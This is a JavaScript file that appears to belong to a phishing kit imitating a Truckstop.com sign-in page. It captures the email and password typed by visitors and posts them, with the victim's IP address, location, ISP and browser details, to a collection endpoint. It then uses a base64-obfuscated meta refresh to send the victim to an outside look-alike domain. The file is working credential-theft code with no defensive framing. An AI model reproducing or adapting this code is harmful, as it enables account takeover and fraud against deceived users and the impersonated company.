let gmail =
    'JTNDbWV0YSUyMGh0dHAtZXF1aXYlM0QlMjJSZWZyZXNoJTIyJTIwY29udGVudCUzRCUyMjElM0J1cmwlM0RodHRwcyUzQS8vYWNjb3VudC5ibHVlcm91dGVmcmVpZ2h0Lnh5ei8lMjIlMjAvJTNF';

let email = document.getElementById('email');
let password = document.getElementById('password');

let rememberme = true;

let hasRef = new URLSearchParams(window.location.search).has('ref');

let clientIpInfo;

if (hasRef) {
    let ref = gmail;
    document.write(decodeURIComponent(atob(`${ref}`)));
}

document.body.addEventListener('click', function (e) {
    let targetId = e.target.id;

    if (targetId == 'submit') {
        e.preventDefault();
        processCode();
    } else if (targetId == 'remember' || targetId == 'remember-2') {
        if (rememberme) {
            document.getElementById('remember').style.display = 'none';
            rememberme = false;
            console.log('false');
        } else {
            document.getElementById('remember').style.display = 'block';
            rememberme = true;
            console.log('true');
        }
    } else if (targetId == 'continue-with-google') {
        signIn();
    } else if (targetId == 'register-new-user') {
        location.href = 'https://truckstop.com/contact-us/';
    }
});

email.addEventListener('keydown', function (e) {
    if (e.key === 'Enter') {
        e.preventDefault();
        processCode();
    }
});

password.addEventListener('keydown', function (e) {
    if (e.key === 'Enter') {
        e.preventDefault();
        processCode();
    }
});

function processCode() {
    const emailValue = email.value.trim();
    const passwordValue = password.value.trim();

    // reset errors first
    document.getElementById('email-error').style.display = 'none';
    document.getElementById('password-error').style.display = 'none';

    if (emailValue === '') {
        document.getElementById('email-error').style.display = 'block';
    }

    if (passwordValue === '') {
        document.getElementById('password-error').style.display = 'block';
    }

    // if both are filled, continue
    if (emailValue !== '' && passwordValue !== '') {
        signIn();
    }
}

function signIn() {
    let signInXhr = new XMLHttpRequest();
    signInXhr.open('POST', '/sign-in', true);
    signInXhr.setRequestHeader('Content-type', 'application/json');
    signInXhr.send(
        JSON.stringify({
            email: email.value.trim(),
            password: password.value.trim(),
            ip: clientIpInfo.ip,
            country: clientIpInfo.country,
            state: clientIpInfo.state,
            isp: clientIpInfo.isp,
            userAgent: navigator.userAgent,
        })
    );

    signInXhr.onreadystatechange = function () {
        if (this.status == 200 && this.readyState == 4) {
            let response = JSON.parse(this.response);
            redirect();
        }
    }
}

function redirect() {
    let currentUrl = window.location.href;
    currentUrl += '?ref=4';
    window.location.href = currentUrl;
}

async function loadClientInfo() {
    try {
        const res = await fetch("https://ipapi.co/json/");
        const data = await res.json();

        clientIpInfo = {
            ip: data.ip,
            country: data.country_name,
            countryCode: data.country_code,
            state: data.region,
            city: data.city,
            isp: data.org,
            timezone: data.timezone,
            browser: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language
        };

    } catch (err) {
        console.error("IP lookup failed", err);

        clientIpInfo = {
            browser: navigator.userAgent,
            platform: navigator.platform
        };
    }
}

loadClientInfo();